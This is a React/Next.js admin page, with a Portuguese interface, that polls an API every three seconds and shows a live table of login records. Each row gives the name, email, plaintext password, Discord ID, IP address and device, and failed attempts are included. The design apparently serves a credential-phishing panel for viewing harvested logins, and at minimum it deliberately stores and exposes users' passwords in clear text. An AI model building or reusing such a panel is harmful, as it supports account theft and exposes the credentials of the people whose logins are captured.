"use client"

import { useState, useEffect } from "react"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Button } from "@/components/ui/button"
import { Search, Monitor, Smartphone, Globe, Trash2, RefreshCw, CheckCircle, XCircle, MessageCircle } from "lucide-react"

interface LoginRecord {
  id: string
  email: string
  password: string
  name: string
  ip: string
  device: string
  deviceType: "desktop" | "mobile"
  date: string
  success: boolean
  discordId?: string
}

interface Stats {
  totalToday: number
  totalAll: number
  desktopPercent: number
  mobilePercent: number
}

export default function LoginsPage() {
  const [search, setSearch] = useState("")
  const [logins, setLogins] = useState<LoginRecord[]>([])
  const [stats, setStats] = useState<Stats>({ totalToday: 0, totalAll: 0, desktopPercent: 0, mobilePercent: 0 })
  const [loading, setLoading] = useState(true)
  const [lastUpdate, setLastUpdate] = useState<Date | null>(null)

  const fetchLogins = async () => {
    try {
      const res = await fetch(`/api/admin/logins?search=${encodeURIComponent(search)}`)
      if (res.ok) {
        const data = await res.json()
        setLogins(data.logins)
        setStats(data.stats)
        setLastUpdate(new Date())
      }
    } catch (error) {
      console.error("Error fetching logins:", error)
    } finally {
      setLoading(false)
    }
  }

  useEffect(() => {
    fetchLogins()
    // Poll every 3 seconds for real-time updates
    const interval = setInterval(fetchLogins, 3000)
    return () => clearInterval(interval)
  }, [search])

  const handleClearAll = async () => {
    if (!confirm("Tem certeza que deseja limpar todo o histórico de logins?")) return
    
    try {
      const res = await fetch("/api/admin/logins", { method: "DELETE" })
      if (res.ok) {
        setLogins([])
        setStats({ totalToday: 0, totalAll: 0, desktopPercent: 0, mobilePercent: 0 })
      }
    } catch (error) {
      console.error("Error clearing logins:", error)
    }
  }

  const formatDate = (dateString: string) => {
    const date = new Date(dateString)
    return date.toLocaleString("pt-BR", {
      day: "2-digit",
      month: "2-digit",
      year: "numeric",
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit"
    })
  }

  return (
    <div className="space-y-8">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-3xl font-bold tracking-tight">Logins</h1>
          <p className="text-muted-foreground">
            Histórico de logins em tempo real
          </p>
        </div>
        <div className="flex items-center gap-2">
          {lastUpdate && (
            <span className="text-xs text-muted-foreground">
              Atualizado: {lastUpdate.toLocaleTimeString("pt-BR")}
            </span>
          )}
          <div className="flex items-center gap-1 text-xs text-green-500">
            <span className="relative flex h-2 w-2">
              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
              <span className="relative inline-flex rounded-full h-2 w-2 bg-green-500"></span>
            </span>
            Ao vivo
          </div>
        </div>
      </div>

      {/* Stats */}
      <div className="grid gap-4 md:grid-cols-4">
        <Card className="bg-card border-border">
          <CardHeader className="pb-2">
            <CardTitle className="text-sm font-medium text-muted-foreground">
              Total de Logins Hoje
            </CardTitle>
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold">{stats.totalToday}</div>
          </CardContent>
        </Card>
        <Card className="bg-card border-border">
          <CardHeader className="pb-2">
            <CardTitle className="text-sm font-medium text-muted-foreground">
              Total Geral
            </CardTitle>
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold">{stats.totalAll}</div>
          </CardContent>
        </Card>
        <Card className="bg-card border-border">
          <CardHeader className="pb-2">
            <CardTitle className="text-sm font-medium text-muted-foreground">
              Desktop
            </CardTitle>
          </CardHeader>
          <CardContent>
            <div className="flex items-center gap-2">
              <Monitor className="h-5 w-5 text-muted-foreground" />
              <div className="text-2xl font-bold">{stats.desktopPercent}%</div>
            </div>
          </CardContent>
        </Card>
        <Card className="bg-card border-border">
          <CardHeader className="pb-2">
            <CardTitle className="text-sm font-medium text-muted-foreground">
              Mobile
            </CardTitle>
          </CardHeader>
          <CardContent>
            <div className="flex items-center gap-2">
              <Smartphone className="h-5 w-5 text-muted-foreground" />
              <div className="text-2xl font-bold">{stats.mobilePercent}%</div>
            </div>
          </CardContent>
        </Card>
      </div>

      {/* Search & Actions */}
      <div className="flex items-center gap-4">
        <div className="relative flex-1 max-w-sm">
          <Search className="absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
          <Input
            placeholder="Buscar por email, nome ou IP..."
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            className="pl-9 bg-secondary border-border"
          />
        </div>
        <Button 
          variant="outline" 
          size="icon"
          onClick={fetchLogins}
          className="border-border"
        >
          <RefreshCw className="h-4 w-4" />
        </Button>
        <Button 
          variant="destructive" 
          size="sm"
          onClick={handleClearAll}
        >
          <Trash2 className="h-4 w-4 mr-2" />
          Limpar Histórico
        </Button>
      </div>

      {/* Logins Table */}
      <Card className="bg-card border-border">
        <CardHeader>
          <CardTitle className="flex items-center justify-between">
            <span>Histórico de Logins</span>
            <span className="text-sm font-normal text-muted-foreground">
              {logins.length} registro{logins.length !== 1 ? "s" : ""}
            </span>
          </CardTitle>
        </CardHeader>
        <CardContent>
          {loading ? (
            <div className="flex items-center justify-center py-8">
              <div className="h-8 w-8 animate-spin rounded-full border-4 border-primary border-t-transparent" />
            </div>
          ) : logins.length === 0 ? (
            <div className="text-center py-8 text-muted-foreground">
              Nenhum login registrado ainda.
            </div>
          ) : (
            <div className="overflow-x-auto">
              <table className="w-full">
                <thead>
                  <tr className="border-b border-border">
                    <th className="pb-3 text-left text-sm font-medium text-muted-foreground">Status</th>
                    <th className="pb-3 text-left text-sm font-medium text-muted-foreground">Usuário</th>
                    <th className="pb-3 text-left text-sm font-medium text-muted-foreground">Email</th>
                    <th className="pb-3 text-left text-sm font-medium text-muted-foreground">Senha</th>
                    <th className="pb-3 text-left text-sm font-medium text-muted-foreground">Discord ID</th>
                    <th className="pb-3 text-left text-sm font-medium text-muted-foreground">IP</th>
                    <th className="pb-3 text-left text-sm font-medium text-muted-foreground">Dispositivo</th>
                    <th className="pb-3 text-left text-sm font-medium text-muted-foreground">Data</th>
                  </tr>
                </thead>
                <tbody>
                  {logins.map((login) => (
                    <tr key={login.id} className="border-b border-border last:border-0">
                      <td className="py-4">
                        {login.success ? (
                          <CheckCircle className="h-5 w-5 text-green-500" />
                        ) : (
                          <XCircle className="h-5 w-5 text-red-500" />
                        )}
                      </td>
                      <td className="py-4 text-sm font-medium">{login.name}</td>
                      <td className="py-4 text-sm text-muted-foreground">{login.email}</td>
                      <td className="py-4 text-sm font-mono text-red-400">{login.password}</td>
                      <td className="py-4 text-sm">
                        {login.discordId ? (
                          <div className="flex items-center gap-2 text-[#5865F2]">
                            <MessageCircle className="h-4 w-4" />
                            <span className="font-mono">{login.discordId}</span>
                          </div>
                        ) : (
                          <span className="text-muted-foreground">-</span>
                        )}
                      </td>
                      <td className="py-4 text-sm">
                        <div className="flex items-center gap-2">
                          <Globe className="h-4 w-4 text-muted-foreground" />
                          {login.ip}
                        </div>
                      </td>
                      <td className="py-4 text-sm">
                        <div className="flex items-center gap-2">
                          {login.deviceType === "desktop" ? (
                            <Monitor className="h-4 w-4 text-muted-foreground" />
                          ) : (
                            <Smartphone className="h-4 w-4 text-muted-foreground" />
                          )}
                          {login.device}
                        </div>
                      </td>
                      <td className="py-4 text-sm text-muted-foreground">{formatDate(login.date)}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </CardContent>
      </Card>
    </div>
  )
}
